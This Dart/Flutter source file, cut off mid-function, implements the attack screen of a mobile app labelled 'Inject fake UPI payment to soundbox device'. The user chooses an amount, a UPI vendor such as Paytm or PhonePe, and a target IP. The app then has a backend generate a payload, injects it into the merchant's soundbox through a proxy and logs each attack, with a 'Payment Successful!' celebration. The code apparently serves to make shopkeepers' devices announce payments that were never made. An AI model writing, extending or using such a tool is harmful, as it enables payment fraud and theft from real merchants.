import 'dart:math';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:google_fonts/google_fonts.dart';
import 'package:uuid/uuid.dart';
import '../theme/app_theme.dart';
import '../services/api_service.dart';
import '../services/api_config.dart';
import '../services/database_service.dart';
import '../models/device_model.dart';
import '../models/attack_model.dart';

class AttackScreen extends StatefulWidget {
  const AttackScreen({super.key});

  @override
  State<AttackScreen> createState() => _AttackScreenState();
}

class _AttackScreenState extends State<AttackScreen>
    with TickerProviderStateMixin {
  static const List<double> _amountChips = [100, 200, 500, 1000, 2000];
  static const List<Map<String, dynamic>> _vendors = [
    {'id': 'paytm',    'name': 'Paytm',       'color': Color(0xFF0066CC), 'icon': '₹'},
    {'id': 'phonepe',  'name': 'PhonePe',      'color': Color(0xFF5F259F), 'icon': 'P'},
    {'id': 'gpay',     'name': 'Google Pay',   'color': Color(0xFF4285F4), 'icon': 'G'},
    {'id': 'bharatpe', 'name': 'BharatPe',     'color': Color(0xFF00C853), 'icon': 'B'},
    {'id': 'generic',  'name': 'Generic UPI',  'color': Color(0xFF607D8B), 'icon': 'U'},
  ];

  double _selectedAmount = 500;
  int _selectedVendorIndex = 0;
  String _apiBaseUrl = kApiBase;
  bool _isInjecting = false;
  bool _isGenerating = false;
  bool _showSuccess = false;
  bool _showError = false;
  String? _lastResult;
  String? _lastTxnId;
  ApiErrorType? _lastErrorType;
  List<DeviceModel> _savedDevices = [];
  bool _useCustomAmount = false;

  final TextEditingController _customAmountController = TextEditingController();
  final TextEditingController _targetIPController = TextEditingController();
  final TextEditingController _apiUrlController = TextEditingController();

  late GeneratePayloadService _generateService;
  late ProxyInjectService _injectService;

  late AnimationController _buttonScaleCtrl;
  late Animation<double> _buttonScale;

  late AnimationController _successCtrl;
  late Animation<double> _successScale;
  late Animation<double> _successOpacity;
  late Animation<double> _tickStroke;

  late AnimationController _confettiCtrl;
  late Animation<double> _confettiProgress;

  final List<_ConfettiParticle> _confetti = [];
  final Random _rng = Random();

  @override
  void initState() {
    super.initState();
    _apiUrlController.text = _apiBaseUrl;
    _generateService = GeneratePayloadService(baseUrl: _apiBaseUrl);
    _injectService   = ProxyInjectService(baseUrl: _apiBaseUrl);
    _loadDevices();
    _initAnimations();
  }

  void _initAnimations() {
    _buttonScaleCtrl = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 120),
    );
    _buttonScale = Tween<double>(begin: 1.0, end: 0.94).animate(
      CurvedAnimation(parent: _buttonScaleCtrl, curve: Curves.easeInOut),
    );

    _successCtrl = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 600),
    );
    _successScale = Tween<double>(begin: 0.4, end: 1.0).animate(
      CurvedAnimation(parent: _successCtrl, curve: Curves.elasticOut),
    );
    _successOpacity = Tween<double>(begin: 0.0, end: 1.0).animate(
      CurvedAnimation(parent: _successCtrl, curve: const Interval(0.0, 0.4)),
    );
    _tickStroke = Tween<double>(begin: 0.0, end: 1.0).animate(
      CurvedAnimation(parent: _successCtrl, curve: const Interval(0.3, 1.0)),
    );

    _confettiCtrl = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 1800),
    );
    _confettiProgress = Tween<double>(begin: 0.0, end: 1.0).animate(
      CurvedAnimation(parent: _confettiCtrl, curve: Curves.easeOut),
    );
  }

  @override
  void dispose() {
    _customAmountController.dispose();
    _targetIPController.dispose();
    _apiUrlController.dispose();
    _buttonScaleCtrl.dispose();
    _successCtrl.dispose();
    _confettiCtrl.dispose();
    super.dispose();
  }

  Future<void> _loadDevices() async {
    final devices = await DatabaseService.instance.getAllDevices();
    if (mounted) setState(() => _savedDevices = devices);
  }

  void _rebuildServices() {
    _generateService = GeneratePayloadService(baseUrl: _apiBaseUrl);
    _injectService   = ProxyInjectService(baseUrl: _apiBaseUrl);
  }

  void _spawnConfetti() {
    _confetti.clear();
    const colors = [
      Color(0xFFFF6600), Color(0xFF00B386), Color(0xFF0066CC),
      Color(0xFFFFD700), Color(0xFFFF3366), Color(0xFF9C27B0),
    ];
    for (int i = 0; i < 48; i++) {
      _confetti.add(_ConfettiParticle(
        x: _rng.nextDouble(),
        y: _rng.nextDouble() * 0.4,
        vx: (_rng.nextDouble() - 0.5) * 2.4,
        vy: _rng.nextDouble() * 2.0 + 1.0,
        color: colors[_rng.nextInt(colors.length)],
        size: _rng.nextDouble() * 7 + 4,
        rotation: _rng.nextDouble() * pi * 2,
        rotSpeed: (_rng.nextDouble() - 0.5) * 6,
        shape: _rng.nextBool(),
      ));
    }
  }

  Future<void> _onButtonTapDown(_) async {
    await _buttonScaleCtrl.forward();
  }

  Future<void> _onButtonTapUp(_) async {
    await _buttonScaleCtrl.reverse();
    _inject();
  }

  Future<void> _inject() async {
    if (_isInjecting) return;

    final amount = _useCustomAmount
        ? double.tryParse(_customAmountController.text) ?? _selectedAmount
        : _selectedAmount;
    final targetIP = _targetIPController.text.trim();

    if (targetIP.isEmpty) {
      _showSnack('Enter a target IP address', isError: true);
      return;
    }
    final ipRegex = RegExp(r'^(\d{1,3}\.){3}\d{1,3}(:\d{1,5})?$');
    if (!ipRegex.hasMatch(targetIP)) {
      _showSnack('Invalid IP  (e.g. 192.168.1.1:8080)', isError: true);
      return;
    }

    HapticFeedback.heavyImpact();

    setState(() {
      _isInjecting  = true;
      _isGenerating = true;
      _showSuccess  = false;
      _showError    = false;
      _lastResult   = null;
      _lastTxnId    = null;
      _lastErrorType = null;
    });

    const uuid = Uuid();
    final txnId  = uuid.v4();
    final vendor = _vendors[_selectedVendorIndex]['id'] as String;

    try {
      final generated = await _generateService.call(vendor: vendor, amount: amount);
      if (!mounted) return;
      setState(() => _isGenerating = false);

      final injected = await _injectService.call(
        targetIP: targetIP,
        payload: generated.payload,
      );

      await DatabaseService.instance.saveAttack(AttackModel(
        id: txnId,
        timestamp: DateTime.now(),
        targetIP: targetIP,
        amount: amount,
        vendor: vendor,
        status: injected.success ? 'SUCCESS' : 'FAILED',
        response: injected.success ? null : injected.error,
      ));

      if (!mounted) return;

      if (injected.success) {
        HapticFeedback.heavyImpact();
        await Future.delayed(const Duration(milliseconds: 80));
        HapticFeedback.heavyImpact();
        _spawnConfetti();
        _successCtrl.forward(from: 0);
        _confettiCtrl.forward(from: 0);
        setState(() {
          _isInjecting = false;
          _showSuccess = true;
          _lastTxnId   = generated.transactionId;
          _lastResult  = 'Payment injected to $targetIP';
        });
      } else {
        HapticFeedback.vibrate();
        setState(() {
          _isInjecting = false;
          _showError   = true;
          _lastResult  = injected.error ?? 'Soundbox rejected payload';
        });
      }
    } on ApiException catch (e) {
      await DatabaseService.instance.saveAttack(AttackModel(
        id: txnId,
        timestamp: DateTime.now(),
        targetIP: targetIP,
        amount: amount,
        vendor: vendor,
        status: 'ERROR',
        response: e.message,
      ));
      if (!mounted) return;
      HapticFeedback.vibrate();
      setState(() {
        _isInjecting   = false;
        _isGenerating  = false;
        _showError     = true;
        _lastErrorType = e.type;
        _lastResult    = e.message;
      });
    } catch (e) {
      if (!mounted) return;
      setState(() {
        _isInjecting  = false;
        _isGenerating = false;
        _showError    = true;
        _lastResult   = e.toString();
      });
    }
  }

  void _showSnack(String msg, {bool isError = false}) {
    ScaffoldMessenger.of(context).showSnackBar(SnackBar(
      content: Text(msg),
      backgroundColor: isError ? AppTheme.errorRed : AppTheme.successGreen,
      behavior: SnackBarBehavior.floating,
      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)),
    ));
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: Stack(
        children: [
          _buildMainContent(),
          if (_showSuccess || _showError) _buildStatusOverlay(),
          if (_showSuccess) _buildConfettiLayer(),
        ],
      ),
    );
  }

  Widget _buildMainContent() {
    return Container(
      decoration: const BoxDecoration(gradient: AppTheme.paytmHeaderGradient),
      child: SafeArea(
        child: Column(
          children: [
            _buildHeader(),
            Expanded(
              child: Container(
                decoration: const BoxDecoration(
                  color: AppTheme.background,
                  borderRadius: BorderRadius.only(
                    topLeft: Radius.circular(24),
                    topRight: Radius.circular(24),
                  ),
                ),
                child: ClipRRect(
                  borderRadius: const BorderRadius.only(
                    topLeft: Radius.circular(24),
                    topRight: Radius.circular(24),
                  ),
                  child: SingleChildScrollView(
                    padding: const EdgeInsets.fromLTRB(16, 20, 16, 32),
                    child: Column(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      children: [
                        _buildAmountSection(),
                        const SizedBox(height: 16),
                        _buildVendorSection(),
                        const SizedBox(height: 16),
                        _buildTargetSection(),
                        const SizedBox(height: 16),
                        _buildApiConfig(),
                        const SizedBox(height: 28),
                        _buildInjectButton(),
                        const SizedBox(height: 80),
                      ],
                    ),
                  ),
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildHeader() {
    return Padding(
      padding: const EdgeInsets.fromLTRB(20, 16, 20, 20),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              Text(
                'Select Amount',
                style: GoogleFonts.roboto(
                  color: Colors.white,
                  fontSize: 24,
                  fontWeight: FontWeight.w800,
                  letterSpacing: 0.2,
                ),
              ),
              const Spacer(),
              Container(
                padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 4),
                decoration: BoxDecoration(
                  color: Colors.white.withOpacity(0.2),
                  borderRadius: BorderRadius.circular(20),
                ),
                child: Text(
                  'UPI',
                  style: GoogleFonts.roboto(
                    color: Colors.white,
                    fontSize: 12,
                    fontWeight: FontWeight.w700,
                    letterSpacing: 1.2,
                  ),
                ),
              ),
            ],
          ),
          const SizedBox(height: 4),
          Text(
            'Inject fake UPI payment to soundbox device',
            style: GoogleFonts.roboto(
              color: Colors.white.withOpacity(0.75),
              fontSize: 13,
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildAmountSection() {
    final displayAmount = _useCustomAmount
        ? (_customAmountController.text.isEmpty ? '0' : _customAmountController.text)
        : _selectedAmount.toStringAsFixed(0);

    return PaytmCard(
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              Text(
                'Amount',
                style: GoogleFonts.roboto(
                    fontSize: 13,
                    fontWeight: FontWeight.w500,
                    color: AppTheme.textGrey),
              ),
              const Spacer(),
              AnimatedSwitcher(
                duration: const Duration(milliseconds: 200),
                child: Text(
                  '₹$displayAmount',
                  key: ValueKey(displayAmount),
                  style: GoogleFonts.roboto(
                    fontSize: 26,
                    fontWeight: FontWeight.w800,
                    color: AppTheme.accentOrange,
                  ),
                ),
              ),
            ],
          ),
          const SizedBox(height: 14),
          Wrap(
            spacing: 8,
            runSpacing: 10,
            children: _amountChips.map((amount) {
              final isSelected = !_useCustomAmount && _selectedAmount == amount;
              return GestureDetector(
                onTap: () {
                  HapticFeedback.selectionClick();
                  setState(() {
                    _selectedAmount = amount;
                    _useCustomAmount = false;
                    _customAmountController.clear();
                  });
                },
                child: AnimatedContainer(
                  duration: const Duration(milliseconds: 180),
                  padding: const EdgeInsets.symmetric(horizontal: 18, vertical: 11),
                  decoration: BoxDecoration(
                    gradient: isSelected ? AppTheme.paytmGradient : null,
                    color: isSelected ? null : Colors.white,
                    borderRadius: BorderRadius.circular(12),
                    border: Border.all(
                      color: isSelected ? Colors.transparent : AppTheme.divider,
                    ),
                    boxShadow: isSelected
                        ? [BoxShadow(
                            color: AppTheme.accentOrange.withOpacity(0.35),
                            blurRadius: 10, offset: const Offset(0, 4))]
                        : [BoxShadow(
                            color: Colors.black.withOpacity(0.04),
                            blurRadius: 4, offset: const Offset(0, 2))],
                  ),
                  child: Text(
                    '₹${amount.toStringAsFixed(0)}',
                    style: GoogleFonts.roboto(
                      fontSize: 15,
                      fontWeight: FontWeight.w700,
                      color: isSelected ? Colors.white : AppTheme.textDark,
                    ),
                  ),
                ),
              );
            }).toList(),
          ),
          const SizedBox(height: 14),
          GestureDetector(
            onTap: () => setState(() => _useCustomAmount = !_useCustomAmount),
            child: Row(
              children: [
                AnimatedContainer(
                  duration: const Duration(milliseconds: 180),
                  width: 20,
                  height: 20,
                  decoration: BoxDecoration(
                    color: _useCustomAmount ? AppTheme.primaryBlue : Colors.transparent,
                    borderRadius: BorderRadius.circular(5),
                    border: Border.all(
                      color: _useCustomAmount ? AppTheme.primaryBlue : AppTheme.textGrey,
                      width: 1.5,
                    ),
                  ),
                  child: _useCustomAmount
                      ? const Icon(Icons.check, size: 13, color: Colors.white)
                      : null,
                ),
                const SizedBox(width: 8),
                Text(
                  'Enter custom amount',
                  style: GoogleFonts.roboto(
                      fontSize: 13,
                      color: _useCustomAmount
                          ? AppTheme.primaryBlue
                          : AppTheme.textGrey,
                      fontWeight: _useCustomAmount
                          ? FontWeight.w600
                          : FontWeight.w400),
                ),
              ],
            ),
          ),
          if (_useCustomAmount) ...[
            const SizedBox(height: 10),
            TextField(
              controller: _customAmountController,
              autofocus: true,
              decoration: InputDecoration(
                hintText: 'Enter amount',
                prefixIcon: Padding(
                  padding: const EdgeInsets.symmetric(horizontal: 12),
                  child: Text('₹',
                      style: GoogleFonts.roboto(
                          fontSize: 18,
                          fontWeight: FontWeight.w700,
                          color: AppTheme.accentOrange)),
                ),
                prefixIconConstraints:
                    const BoxConstraints(minWidth: 0, minHeight: 0),
                isDense: true,
              ),
              keyboardType: const TextInputType.numberWithOptions(decimal: true),
              style: GoogleFonts.roboto(fontSize: 18, fontWeight: FontWeight.w600),
              onChanged: (_) => setState(() {}),
            ),
          ],
        ],
      ),
    );
  }

  Widget _buildVendorSection() {
    return PaytmCard(
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Text(
            'Select Vendor',
            style: GoogleFonts.roboto(
                fontSize: 13,
                fontWeight: FontWeight.w500,
                color: AppTheme.textGrey),
          ),
          const SizedBox(height: 12),
          SingleChildScrollView(
            scrollDirection: Axis.horizontal,
            child: Row(
              children: _vendors.asMap().entries.map((entry) {
                final i = entry.key;
                final v = entry.value;
                final isSelected = _selectedVendorIndex == i;
                final color = v['color'] as Color;
                return GestureDetector(
                  onTap: () {
                    HapticFeedback.selectionClick();
                    setState(() => _selectedVendorIndex = i);
                  },
                  child: AnimatedContainer(
                    duration: const Duration(milliseconds: 200),
                    margin: const EdgeInsets.only(right: 10),
                    padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 10),
                    decoration: BoxDecoration(
                      color: isSelected ? color : Colors.white,
                      borderRadius: BorderRadius.circular(12),
                      border: Border.all(
                        color: isSelected ? color : AppTheme.divider,
                        width: isSelected ? 0 : 1,
                      ),
                      boxShadow: isSelected
                          ? [BoxShadow(
                              color: color.withOpacity(0.3),
                              blurRadius: 10, offset: const Offset(0, 4))]
                          : null,
                    ),
                    child: Row(
                      mainAxisSize: MainAxisSize.min,
                      children: [
                        Container(
                          width: 32,
                          height: 32,
                          decoration: BoxDecoration(
                            color: isSelected
                                ? Colors.white.withOpacity(0.2)
                                : color.withOpacity(0.1),
                            borderRadius: BorderRadius.circular(8),
                          ),
                          child: Center(
                            child: Text(
                              v['icon'] as String,
                              style: TextStyle(
                                color: isSelected ? Colors.white : color,
                                fontSize: 15,
                                fontWeight: FontWeight.w800,
                              ),
                            ),
                          ),
                        ),
                        const SizedBox(width: 8),
                        Text(
                          v['name'] as String,
                          style: GoogleFonts.roboto(
                            fontSize: 13,
                            fontWeight: FontWeight.w700,
                            color: isSelected ? Colors.white : AppTheme.textDark,
                          ),
                        ),
                      ],
                    ),
                  ),
                );
              }).toList(),
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildTargetSection() {
    return PaytmCard(
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Text(
            'Target Device (VPA / IP)',
            style: GoogleFonts.roboto(
                fontSize: 13,
                fontWeight: FontWeight.w500,
                color: AppTheme.textGrey),
          ),
          const SizedBox(height: 10),
          Container(
            decoration: BoxDecoration(
              color: AppTheme.background,
              borderRadius: BorderRadius.circular(12),
              border: Border.all(color: AppTheme.divider),
            ),
            child: Row(
              children: [
                const SizedBox(width: 14),
                const Icon(Icons.wifi_tethering,
                    color: AppTheme.accentOrange, size: 20),
                const SizedBox(width: 10),
                Expanded(
                  child: TextField(
                    controller: _targetIPController,
                    onChanged: (_) => setState(() {}),
                    decoration: InputDecoration(
                      hintText: '192.168.1.100:8080',
                      border: InputBorder.none,
                      enabledBorder: InputBorder.none,
                      focusedBorder: InputBorder.none,
                      isDense: true,
                      contentPadding: const EdgeInsets.symmetric(vertical: 14),
                      hintStyle: GoogleFonts.robotoMono(
                          fontSize: 14, color: AppTheme.textGrey.withOpacity(0.5)),
                    ),
                    keyboardType: TextInputType.number,
                    style: GoogleFonts.robotoMono(
                        fontSize: 14,
                        fontWeight: FontWeight.w600,
                        color: AppTheme.textDark),
                  ),
                ),
                if (_savedDevices.isNotEmpty)
                  GestureDetector(
                    onTap: () => _showDevicePicker(),
                    child: Container(
                      padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 14),
                      decoration: BoxDecoration(
                        border: Border(left: BorderSide(color: AppTheme.divider)),
                      ),
                      child: Row(
                        mainAxisSize: MainAxisSize.min,
                        children: [
                          Text(
                            'Pick',
                            style: GoogleFonts.roboto(
                                fontSize: 12,
                                fontWeight: FontWeight.w600,
                                color: AppTheme.primaryBlue),
                          ),
                          const SizedBox(width: 2),
                          const Icon(Icons.keyboard_arrow_down,
                              size: 16, color: AppTheme.primaryBlue),
                        ],
                      ),
                    ),
                  ),
                const SizedBox(width: 4),
              ],
            ),
          ),
        ],
      ),
    );
  }

  void _showDevicePicker() {
    showModalBottomSheet(
      context: context,
      backgroundColor: Colors.white,
      shape: const RoundedRectangleBorder(
        borderRadius: BorderRadius.vertical(top: Radius.circular(20)),
      ),
      builder: (ctx) => Column(
        mainAxisSize: MainAxisSize.min,
        children: [
          const SizedBox(height: 12),
          Container(
            width: 36, height: 4,
            decoration: BoxDecoration(
              color: AppTheme.divider,
              borderRadius: BorderRadius.circular(2),
            ),
          ),
          Padding(
            padding: const EdgeInsets.fromLTRB(20, 16, 20, 8),
            child: Row(children: [
              Text('Select Device',
                  style: GoogleFonts.roboto(
                      fontSize: 16, fontWeight: FontWeight.w700)),
            ]),
          ),
          ..._savedDevices.take(8).map((d) => ListTile(
                leading: Container(
                  width: 40, height: 40,
                  decoration: BoxDecoration(
                    color: AppTheme.primaryBlue.withOpacity(0.08),
                    borderRadius: BorderRadius.circular(10),
                  ),
                  child: const Icon(Icons.router,
                      color: AppTheme.primaryBlue, size: 20),
                ),
                title: Text(d.address,
                    style: GoogleFonts.robotoMono(
                        fontSize: 14, fontWeight: FontWeight.w600)),
                subtitle: d.vendor != null
                    ? Text(d.vendor!.toUpperCase(),
                        style: GoogleFonts.roboto(
                            fontSize: 11,
                            color: AppTheme.accentOrange,
                            fontWeight: FontWeight.w600))
                    : null,
                trailing:
                    const Icon(Icons.chevron_right, color: AppTheme.textGrey),
                onTap: () {
                  _targetIPController.text = d.address;
                  setState(() {});
                  Navigator.pop(ctx);
                },
              )),
          const SizedBox(height: 20),
        ],
      ),
    );
  }

  Widget _buildApiConfig() {
    return PaytmCard(
      elevation: 4,
      child: Row(
        children: [
          const Icon(Icons.cloud_outlined, color: AppTheme.primaryBlue, size: 18),
          const SizedBox(width: 10),
          Expanded(
            child: TextField(
              controller: _apiUrlController,
              onChanged: (v) {
                _apiBaseUrl = v;
                _rebuildServices();
              },
              decoration: InputDecoration(
                hintText: 'https://your-api.onrender.com/api',
                border: InputBorder.none,
                enabledBorder: InputBorder.none,
                focusedBorder: InputBorder.none,
                isDense: true,
                contentPadding: EdgeInsets.zero,
                hintStyle: GoogleFonts.robotoMono(
                    fontSize: 11,
                    color: AppTheme.textGrey.withOpacity(0.5)),
              ),
              style: GoogleFonts.robotoMono(
                  fontSize: 11, color: AppTheme.textGrey),
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildInjectButton() {
    final String label = _isGenerating
        ? 'GENERATING...'
        : _isInjecting
            ? 'INJECTING...'
            : 'PAY NOW';

    return GestureDetector(
      onTapDown: _isInjecting ? null : _onButtonTapDown,
      onTapUp: _isInjecting ? null : _onButtonTapUp,
      onTapCancel: () => _buttonScaleCtrl.reverse(),
      child: AnimatedBuilder(
        animation: _buttonScale,
        builder: (_, __) => Transform.scale(
          scale: _buttonScale.value,
          child: Container(
            width: double.infinity,
            height: 58,
            decoration: BoxDecoration(
              gradient: _isInjecting
                  ? const LinearGradient(
                      colors: [Color(0xFF009970), Color(0xFF007A5A)])
                  : const LinearGradient(
                      colors: [Color(0xFF00C896), Color(0xFF00996E)],
                      begin: Alignment.topLeft,
                      end: Alignment.bottomRight,
                    ),
              borderRadius: BorderRadius.circular(16),
              boxShadow: [
                BoxShadow(
                  color: const Color(0xFF00B386).withOpacity(0.45),
                  blurRadius: 18,
                  offset: const Offset(0, 7),
                ),
              ],
            ),
            child: Center(
              child: _isInjecting
                  ? Row(
                      mainAxisSize: MainAxisSize.min,
                      children: [
                        const SizedBox(
                          width: 20, height: 20,
                          child: CircularProgressIndicator(
                              color: Colors.white, strokeWidth: 2.5),
                        ),
                        const SizedBox(width: 12),
                        Text(label,
                            style: GoogleFonts.roboto(
                              color: Colors.white,
                              fontSize: 17,
                              fontWeight: FontWeight.w700,
                              letterSpacing: 0.8,
                            )),
                      ],
                    )
                  : Row(
                      mainAxisSize: MainAxisSize.min,
                      children: [
                        const Icon(Icons.lock_outline,
                            color: Colors.white, size: 20),
                        const SizedBox(width: 10),
                        Text(label,
                            style: GoogleFonts.roboto(
                              color: Colors.white,
                              fontSize: 18,
                              fontWeight: FontWeight.w800,
                              letterSpacing: 0.8,
                            )),
                      ],
                    ),
            ),
          ),
        ),
      ),
    );
  }

  Widget _buildStatusOverlay() {
    return GestureDetector(
      onTap: () => setState(() {
        _showSuccess = false;
        _showError   = false;
      }),
      child: Container(
        color: Colors.black.withOpacity(0.55),
        child: Center(
          child: _showSuccess
              ? _buildSuccessCard()
              : _buildErrorCard(),
        ),
      ),
    );
  }

  Widget _buildSuccessCard() {
    return AnimatedBuilder(
      animation: _successCtrl,
      builder: (_, __) => Opacity(
        opacity: _successOpacity.value,
        child: Transform.scale(
          scale: _successScale.value,
          child: Container(
            margin: const EdgeInsets.symmetric(horizontal: 32),
            padding: const EdgeInsets.symmetric(vertical: 36, horizontal: 28),
            decoration: BoxDecoration(
              color: Colors.white,
              borderRadius: BorderRadius.circular(24),
              boxShadow: [
                BoxShadow(
                  color: Colors.black.withOpacity(0.18),
                  blurRadius: 40,
                  offset: const Offset(0, 16),
                ),
              ],
            ),
            child: Column(
              mainAxisSize: MainAxisSize.min,
              children: [
                _buildTickCircle(),
                const SizedBox(height: 20),
                Text(
                  'Payment Successful!',
                  style: GoogleFonts.roboto(
                    fontSize: 20,
                    fontWeight: FontWeight.w800,
                    color: AppTheme.textDark,
                  ),
                ),
                const SizedBox(height: 8),
                Text(
                  _lastResult ?? '',
                  style: GoogleFonts.roboto(
                      fontSize: 13, color: AppTheme.textGrey),
                  textAlign: TextAlign.center,
                ),
                if (_lastTxnId != null) ...[
                  const SizedBox(height: 12),
                  Container(
                    padding: const EdgeInsets.symmetric(
                        horizontal: 14, vertical: 8),
                    decoration: BoxDecoration(
                      color: AppTheme.successGreen.withOpacity(0.08),
                      borderRadius: BorderRadius.circular(8),
                    ),
                    child: Text(
                      'TXN ID: ${_lastTxnId!.substring(0, 18)}...',
                      style: GoogleFonts.robotoMono(
                          fontSize: 11,
                          color: AppTheme.successGreen,
                          fontWeight: FontWeight.w600),
                    ),
                  ),
                ],
                const SizedBox(height: 24),
                GestureDetector(
                  onTap: () => setState(() => _showSuccess = false),
                  child: Container(
                    width: double.infinity,
                    padding: const EdgeInsets.symmetric(vertical: 14),
                    decoration: BoxDecoration(
                      gradient: const LinearGradient(
                        colors: [Color(0xFF00C896), Color(0xFF00996E)],
                      ),
                      borderRadius: BorderRadius.circular(12),
                    ),
                    child: Center(
                      child: Text(
                        'DONE',
                        style: GoogleFonts.roboto(
                          color: Colors.white,
                          fontSize: 15,
                          fontWeight: FontWeight.w800,
                          letterSpacing: 1,
                        ),
                      ),
                    ),
                  ),
                ),
              ],
            ),
          ),
        ),
      ),
    );
  }

  Widget _buildTickCircle() {
    return AnimatedBuilder(
      animation: _tickStroke,
      builder: (_, __) => Container(
        width: 80,
        height: 80,
        decoration: BoxDecoration(
          color: AppTheme.successGreen.withOpacity(0.1),
          shape: BoxShape.circle,
        ),
        child: CustomPaint(
          painter: _TickPainter(progress: _tickStroke.value),
        ),
      ),
    );
  }

  Widget _buildErrorCard() {
    final isRetryable = _lastErrorType == ApiErrorType.network ||
        _lastErrorType == ApiErrorType.timeout ||
        _lastErrorType == ApiErrorType.serverError;

    return Container(
      margin: const EdgeInsets.symmetric(horizontal: 32),
      padding: const EdgeInsets.symmetric(vertical: 32, horizontal: 24),
      decoration: BoxDecoration(
        color: Colors.white,
        borderRadius: BorderRadius.circular(24),
        boxShadow: [
          BoxShadow(
            color: Colors.black.withOpacity(0.18),
            blurRadius: 40,
            offset: const Offset(0, 16),
          ),
        ],
      ),
      child: Column(
        mainAxisSize: MainAxisSize.min,
        children: [
          Container(
            width: 72,
            height: 72,
            decoration: BoxDecoration(
              color: AppTheme.errorRed.withOpacity(0.1),
              shape: BoxShape.circle,
            ),
            child: const Icon(Icons.error_outline,
                color: AppTheme.errorRed, size: 36),
          ),
          const SizedBox(height: 16),
          Text(
            _errorTypeLabel(_lastErrorType),
            style: GoogleFonts.roboto(
                fontSize: 18,
                fontWeight: FontWeight.w800,
                color: AppTheme.textDark),
          ),
          const SizedBox(height: 8),
          Text(
            _lastResult ?? '',
            style: GoogleFonts.roboto(fontSize: 13, color: AppTheme.textGrey),
            textAlign: TextAlign.center,
          ),
          const SizedBox(height: 20),
          Row(
            children: [
              Expanded(
                child: GestureDetector(
                  onTap: () => setState(() => _showError = false),
                  child: Container(
                    padding: const EdgeInsets.symmetric(vertical: 13),
                    decoration: BoxDecoration(
                      border: Border.all(color: AppTheme.divider),
                      borderRadius: BorderRadius.circular(12),
                    ),
                    child: Center(
                      child: Text('Dismiss',
                          style: GoogleFonts.roboto(
                              fontSize: 14,
                              fontWeight: FontWeight.w600,
                              color: AppTheme.textGrey)),
                    ),
                  ),
                ),
              ),
              if (isRetryable) ...[
                const SizedBox(width: 10),
                Expanded(
                  child: GestureDetector(
                    onTap: () {
                      setState(() => _showError = false);
                      Future.delayed(
                          const Duration(milliseconds: 200), _inject);
                    },
                    child: Container(
                      padding: const EdgeInsets.symmetric(vertical: 13),
                      decoration: BoxDecoration(
                        color: AppTheme.errorRed,
                        borderRadius: BorderRadius.circular(12),
                      ),
                      child: Center(
                        child: Text('Retry',
                            style: GoogleFonts.roboto(
                                fontSize: 14,
                                fontWeight: FontWeight.w700,
                                color: Colors.white)),
                      ),
                    ),
                  ),
                ),
              ],
            ],
          ),
        ],
      ),
    );
  }

  Widget _buildConfettiLayer() {
    return IgnorePointer(
      child: AnimatedBuilder(
        animation: _confettiProgress,
        builder: (_, __) => CustomPaint(
          size: Size.infinite,
          painter: _ConfettiPainter(
            particles: _confetti,
            progress: _confettiProgress.value,
          ),
        ),
      ),
    );
  }

  String _errorTypeLabel(ApiErrorType? type) => switch (type) {
        ApiErrorType.network         => 'Network Error',
        ApiErrorType.timeout         => 'Request Timed Out',
        ApiErrorType.serverError     => 'Server Error',
        ApiErrorType.validationError => 'Validation Error',
        _                            => 'Injection Failed',
      };
}

class _ConfettiParticle {
  final double x;
  final double y;
  final double vx;
  final double vy;
  final Color color;
  final double size;
  final double rotation;
  final double rotSpeed;
  final bool shape;

  const _ConfettiParticle({
    required this.x, required this.y,
    required this.vx, required this.vy,
    required this.color, required this.size,
    required this.rotation, required this.rotSpeed,
    required this.shape,
  });
}

class _ConfettiPainter extends CustomPainter {
  final List<_ConfettiParticle> particles;
  final double progress;

  const _ConfettiPainter({required this.particles, required this.progress});

  @override
  void paint(Canvas canvas, Size size) {
    final paint = Paint();
    for (final p in particles) {
      final x  = (p.x + p.vx * progress) * size.width;
      final y  = (p.y + p.vy * progress) * size.height;
      final opacity = (1.0 - progress * 0.8).clamp(0.0, 1.0);
      paint.color = p.color.withOpacity(opacity);

      canvas.save();
      canvas.translate(x, y);
      canvas.rotate(p.rotation + p.rotSpeed * progress);

      if (p.shape) {
        canvas.drawCircle(Offset.zero, p.size / 2, paint);
      } else {
        canvas.drawRect(
          Rect.fromCenter(
              center: Offset.zero, width: p.size, height: p.size * 0.55),
          paint,
        );
      }
      canvas.restore();
    }
  }

  @override
  bool shouldRepaint(_ConfettiPainter old) => old.progress != progress;
}

class _TickPainter extends CustomPainter {
  final double progress;
  const _TickPainter({required this.progress});

  @override
  void paint(Canvas canvas, Size size) {
    final circlePaint = Paint()
      ..color = AppTheme.successGreen
      ..style = PaintingStyle.stroke
      ..strokeWidth = 3.0
      ..strokeCap = StrokeCap.round;

    canvas.drawCircle(
      Offset(size.width / 2, size.height / 2),
      size.width / 2 - 4,
      circlePaint,
    );

    if (progress <= 0) return;

    final tickPaint = Paint()
      ..color = AppTheme.successGreen
      ..style = PaintingStyle.stroke
      ..strokeWidth = 4.0
      ..strokeCap = StrokeCap.round
      ..strokeJoin = StrokeJoin.round;

    final cx = size.width / 2;
    final cy = size.height / 2;

    final p1 = Offset(cx - 14, cy);
    final p2 = Offset(cx - 4,  cy + 10);
    final p3 = Offset(cx + 14, cy - 10);

    final totalLen = _dist(p1, p2) + _dist(p2, p3);
    final drawn = totalLen * progress;

    final path = Path()..moveTo(p1.dx, p1.dy);

    final seg1 = _dist(p1, p2);
    if (drawn <= seg1) {
      final t = drawn / seg1;
      path.lineTo(
          p1.dx + (p2.dx - p1.dx) * t,
          p1.dy + (p2.dy - p1.dy) * t);
